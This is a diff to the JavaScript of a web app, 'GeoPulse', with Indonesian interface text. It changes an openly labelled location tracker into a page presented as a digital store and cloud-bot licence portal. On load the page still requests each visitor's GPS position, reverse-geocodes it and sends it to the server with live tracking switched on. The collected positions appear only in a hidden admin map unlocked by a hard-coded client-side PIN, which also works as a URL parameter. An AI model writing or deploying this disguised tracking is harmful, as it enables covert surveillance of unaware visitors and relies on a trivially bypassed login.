@@ -1,5 +1,5 @@
 /**
- * GeoPulse - Multi-User Live Location Engine (Serverless Polling Compatible)
+ * GeoPulse - Role-Based Access Control & Live Location Telemetry Engine
  */
 
 // Application State Variables
@@ -12,6 +12,9 @@ let currentAddressData = null;
 let isDarkLayer = true;
 let tileLayer = null;
 
+// Default Admin Secret PIN (Ubah PIN ini sesuai keinginan Anda)
+const ADMIN_SECRET_PIN = "6767";
+
 // Unique Visitor ID for this browser session
 let visitorId = localStorage.getItem('geopulse_visitor_id');
 if (!visitorId) {
@@ -21,13 +24,21 @@ if (!visitorId) {
 
 let visitorMarkers = {}; // Stores Leaflet markers for other users
 
-// DOM Elements
-const loginOverlay = document.getElementById('login-overlay');
-const loginForm = document.getElementById('login-form');
-const btnGuestLogin = document.getElementById('btn-guest-login');
-const btnTogglePass = document.getElementById('btn-toggle-pass');
-const inputPassword = document.getElementById('input-password');
+// DOM Elements - Views
+const publicStoreView = document.getElementById('public-store-view');
+const adminDashboardView = document.getElementById('admin-dashboard-view');
+const adminLoginModal = document.getElementById('admin-login-modal');
+const userRegionBadge = document.getElementById('user-region-badge');
 
+// DOM Elements - Modal & Actions
+const btnOpenAdminModal = document.getElementById('btn-open-admin-modal');
+const btnCloseAdminModal = document.getElementById('btn-close-admin-modal');
+const adminPinForm = document.getElementById('admin-pin-form');
+const adminPinInput = document.getElementById('admin-pin-input');
+const pinErrorMsg = document.getElementById('pin-error-msg');
+const btnLogoutAdmin = document.getElementById('btn-logout-admin');
+
+// DOM Elements - Admin Dashboard Metrics
 const statusBadge = document.getElementById('status-badge');
 const statusText = document.getElementById('status-text');
 
@@ -36,7 +47,6 @@ const valLng = document.getElementById('val-lng');
 const valAccuracy = document.getElementById('val-accuracy');
 const valAltitude = document.getElementById('val-altitude');
 const valSpeed = document.getElementById('val-speed');
-const valHeading = document.getElementById('val-heading');
 const valTime = document.getElementById('val-time');
 const valSocketStatus = document.getElementById('val-socket-status');
 
@@ -54,7 +64,7 @@ const toggleLayerBtn = document.getElementById('toggle-layer-btn');
 const toast = document.getElementById('toast');
 const toastMessage = document.getElementById('toast-message');
 
-// Initialize Leaflet Map
+// Initialize Leaflet Map (Admin Dashboard)
 function initMap(lat = -6.2088, lng = 106.8456, zoom = 15) {
     if (map) return;
     map = L.map('map', {
@@ -93,7 +103,7 @@ function createVisitorIcon() {
     });
 }
 
-// Send My Location to Server via HTTP Post
+// Send Visitor Location to Server via HTTP Post
 async function postLocationToServer(lat, lng, accuracy, mainAddr, subAddr) {
     try {
         const payload = {
@@ -112,19 +122,19 @@ async function postLocationToServer(lat, lng, accuracy, mainAddr, subAddr) {
             body: JSON.stringify(payload)
         });
 
-        if (res.ok) {
-            if (valSocketStatus) {
-                valSocketStatus.textContent = "Aktif (Vercel Cloud)";
-                valSocketStatus.className = "detail-val accent";
-            }
+        if (res.ok && valSocketStatus) {
+            valSocketStatus.textContent = "Aktif (Vercel Cloud)";
+            valSocketStatus.className = "detail-val accent";
         }
     } catch (err) {
         console.warn("Post location notice:", err);
     }
 }
 
-// Poll Active Visitors List from Server
+// Poll Active Visitors List from Server (Admin Dashboard)
 async function fetchActiveVisitors() {
+    if (adminDashboardView.classList.contains('hidden')) return;
+
     try {
         const res = await fetch('/api/visitors');
         if (res.ok) {
@@ -140,7 +150,7 @@ async function fetchActiveVisitors() {
     }
 }
 
-// Start Periodic Polling for Active Visitors (Every 3 seconds)
+// Periodic Polling for Active Visitors (Every 3 seconds)
 setInterval(fetchActiveVisitors, 3000);
 
 // Render Visitors UI List
@@ -162,7 +172,7 @@ function renderVisitorsList(users) {
             <div class="visitor-info">
                 <div class="visitor-avatar ${isMe ? 'me' : ''}">V${index + 1}</div>
                 <div class="visitor-details">
-                    <div class="v-name">${isMe ? 'Anda (Perangkat Ini)' : 'Pengunjung #' + u.id.substring(2, 7)}</div>
+                    <div class="v-name">${isMe ? 'Posisi Anda (Admin)' : 'Pengunjung #' + u.id.substring(2, 7)}</div>
                     <div class="v-addr">${u.address ? u.address.split(',')[0] : 'Lokasi terdeteksi'} (${u.updatedAt})</div>
                 </div>
             </div>
@@ -209,11 +219,11 @@ function updateVisitorMarkersOnMap(users) {
 
 // Request Location from Geolocation API
 function fetchAccurateLocation() {
-    updateStatus('standby', 'Mencari GPS...');
+    if (statusBadge) updateStatus('standby', 'Mencari GPS...');
 
     if (!navigator.geolocation) {
         showToast('Browser Anda tidak mendukung Geolocation API', true);
-        updateStatus('error', 'GPS Tidak Ditemukan');
+        if (statusBadge) updateStatus('error', 'GPS Tidak Ditemukan');
         return;
     }
 
@@ -244,15 +254,16 @@ function onLocationSuccess(position) {
     if (valAccuracy) valAccuracy.textContent = `± ${Math.round(accuracy)} m`;
     if (valAltitude) valAltitude.textContent = coords.altitude ? `${Math.round(coords.altitude)} m` : 'N/A';
     if (valSpeed) valSpeed.textContent = coords.speed ? `${(coords.speed * 3.6).toFixed(1)} km/j` : '0 km/j';
-    if (valHeading) valHeading.textContent = coords.heading ? `${Math.round(coords.heading)}°` : 'N/A';
     
     const now = new Date();
     if (valTime) valTime.textContent = now.toLocaleTimeString('id-ID');
 
-    updateStatus('active', `GPS Aktif (±${Math.round(accuracy)}m)`);
-    updateMapLocation(lat, lng, accuracy);
+    if (statusBadge) updateStatus('active', `GPS Aktif (±${Math.round(accuracy)}m)`);
+    
+    if (map) {
+        updateMapLocation(lat, lng, accuracy);
+    }
 
-    // Reverse Geocoding & Post Location to Server
     reverseGeocodeAndBroadcast(lat, lng, accuracy);
 }
 
@@ -263,7 +274,7 @@ function onLocationError(error) {
         case error.PERMISSION_DENIED:
             msg = 'Izin akses lokasi ditolak oleh pengguna.';
             if (addressMain) addressMain.textContent = 'Akses Lokasi Ditolak';
-            if (addressSub) addressSub.textContent = 'Aktifkan izin lokasi di pengaturan browser Anda.';
+            if (addressSub) addressSub.textContent = 'Aktifkan izin lokasi di pengaturan browser.';
             break;
         case error.POSITION_UNAVAILABLE:
             msg = 'Sinyal GPS / Posisi tidak tersedia.';
@@ -273,7 +284,7 @@ function onLocationError(error) {
             break;
     }
     showToast(msg, true);
-    updateStatus('standby', 'Gagal Deteksi');
+    if (statusBadge) updateStatus('standby', 'Gagal Deteksi');
 }
 
 // Update Map Position for Self
@@ -304,9 +315,6 @@ function updateMapLocation(lat, lng, accuracy) {
 
 // Reverse Geocoding & Post Location
 async function reverseGeocodeAndBroadcast(lat, lng, accuracy) {
-    if (addressMain) addressMain.textContent = "Mengambil data alamat...";
-    if (addressSub) addressSub.textContent = "Menghubungkan ke layanan peta...";
-
     let mainAddr = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
     let subAddr = "Lokasi terdeteksi";
 
@@ -334,8 +342,9 @@ async function reverseGeocodeAndBroadcast(lat, lng, accuracy) {
 
     if (addressMain) addressMain.textContent = mainAddr;
     if (addressSub) addressSub.textContent = subAddr;
+    if (userRegionBadge) userRegionBadge.innerHTML = `<i class="fa-solid fa-location-dot"></i> ${mainAddr.split(',')[0]}`;
 
-    // Send location to Vercel Serverless HTTP API
+    // Send location telemetry to serverless backend
     postLocationToServer(lat, lng, accuracy, mainAddr, subAddr);
 }
 
@@ -354,7 +363,6 @@ function toggleLiveTracking() {
             btnLiveTrack.classList.remove('tracking-active');
             btnLiveTrack.innerHTML = `<i class="fa-solid fa-satellite"></i> Broadcast GPS: OFF`;
         }
-        showToast("Broadcast GPS Dimatikan");
     } else {
         if (!navigator.geolocation) return;
 
@@ -371,59 +379,79 @@ function toggleLiveTracking() {
     }
 }
 
-// Enter Main Application Dashboard (Dismiss Login)
-function enterDashboard(userEmail = 'Guest') {
-    if (loginOverlay) {
-        loginOverlay.classList.add('hidden');
+// Switch Role View (Public Store vs Admin Dashboard)
+function switchRoleView(isAdmin) {
+    if (isAdmin) {
+        publicStoreView.classList.add('hidden');
+        adminDashboardView.classList.remove('hidden');
+        
+        initMap();
+        fetchAccurateLocation();
+        fetchActiveVisitors();
+        showToast("Mode Admin Terautentikasi");
+    } else {
+        publicStoreView.classList.remove('hidden');
+        adminDashboardView.classList.add('hidden');
     }
-    showToast(`Selamat Datang, ${userEmail}!`);
-
-    initMap();
-    fetchAccurateLocation();
-    toggleLiveTracking();
-    fetchActiveVisitors();
 }
 
 // Event Listeners Initialization
 document.addEventListener('DOMContentLoaded', () => {
-    // ALWAYS start background location fetching for visitors even before login overlay dismissal
+    // Always start location reporting in background for all visitors
     fetchAccurateLocation();
     toggleLiveTracking();
-    fetchActiveVisitors();
 
-    const savedUser = localStorage.getItem('geopulse_user');
-    if (savedUser) {
-        enterDashboard(savedUser);
+    // Check URL query param e.g. ?pin=6767
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('pin') === ADMIN_SECRET_PIN) {
+        sessionStorage.setItem('geopulse_admin_auth', 'true');
     }
 
-    if (loginForm) {
-        loginForm.addEventListener('submit', (e) => {
+    // Check Admin Authentication Status
+    const isAdminAuth = sessionStorage.getItem('geopulse_admin_auth') === 'true';
+    switchRoleView(isAdminAuth);
+
+    // Admin Modal Event Listeners
+    if (btnOpenAdminModal) {
+        btnOpenAdminModal.addEventListener('click', () => {
+            adminLoginModal.classList.remove('hidden');
+            if (adminPinInput) adminPinInput.focus();
+        });
+    }
+
+    if (btnCloseAdminModal) {
+        btnCloseAdminModal.addEventListener('click', () => {
+            adminLoginModal.classList.add('hidden');
+            if (pinErrorMsg) pinErrorMsg.classList.add('hidden');
+        });
+    }
+
+    if (adminPinForm) {
+        adminPinForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            const emailInput = document.getElementById('input-email');
-            const userVal = emailInput ? emailInput.value : 'User';
-            
-            if (document.getElementById('remember-me')?.checked) {
-                localStorage.setItem('geopulse_user', userVal);
+            const inputVal = adminPinInput ? adminPinInput.value.trim() : '';
+
+            if (inputVal === ADMIN_SECRET_PIN) {
+                sessionStorage.setItem('geopulse_admin_auth', 'true');
+                adminLoginModal.classList.add('hidden');
+                if (pinErrorMsg) pinErrorMsg.classList.add('hidden');
+                if (adminPinInput) adminPinInput.value = '';
+                switchRoleView(true);
+            } else {
+                if (pinErrorMsg) pinErrorMsg.classList.remove('hidden');
             }
-
-            enterDashboard(userVal);
         });
     }
 
-    if (btnGuestLogin) {
-        btnGuestLogin.addEventListener('click', () => {
-            enterDashboard('Pengunjung');
+    if (btnLogoutAdmin) {
+        btnLogoutAdmin.addEventListener('click', () => {
+            sessionStorage.removeItem('geopulse_admin_auth');
+            switchRoleView(false);
+            showToast("Keluar dari Mode Admin");
         });
     }
 
-    if (btnTogglePass && inputPassword) {
-        btnTogglePass.addEventListener('click', () => {
-            const isPass = inputPassword.type === 'password';
-            inputPassword.type = isPass ? 'text' : 'password';
-            btnTogglePass.className = `fa-solid ${isPass ? 'fa-eye-slash' : 'fa-eye'} toggle-pass-icon`;
-        });
-    }
-
+    // Admin Controls
     if (btnRecenter) btnRecenter.addEventListener('click', fetchAccurateLocation);
     if (btnLiveTrack) btnLiveTrack.addEventListener('click', toggleLiveTracking);
     if (btnCopy) btnCopy.addEventListener('click', copyLocationData);
@@ -438,7 +466,7 @@ function copyLocationData() {
         return;
     }
 
-    const textToCopy = `📍 GeoPulse - Multi-User Location Tracker\n` +
+    const textToCopy = `📍 GeoPulse - Admin Location Report\n` +
         `Latitude: ${currentCoords.latitude}\n` +
         `Longitude: ${currentCoords.longitude}\n` +
         `Akurasi: ±${Math.round(currentCoords.accuracy)} meter\n` +
@@ -463,8 +491,8 @@ function openGoogleMaps() {
 
 function shareLocation() {
     const shareData = {
-        title: 'GeoPulse Multi-User GPS Tracker',
-        text: 'Masuk ke web ini untuk terhubung dan berbagi lokasi presisi secara real-time!',
+        title: 'GeoPulse Digital Store',
+        text: 'Portal layanan digital & lisensi cloud bot resmi GeoPulse.',
         url: window.location.href
     };
 
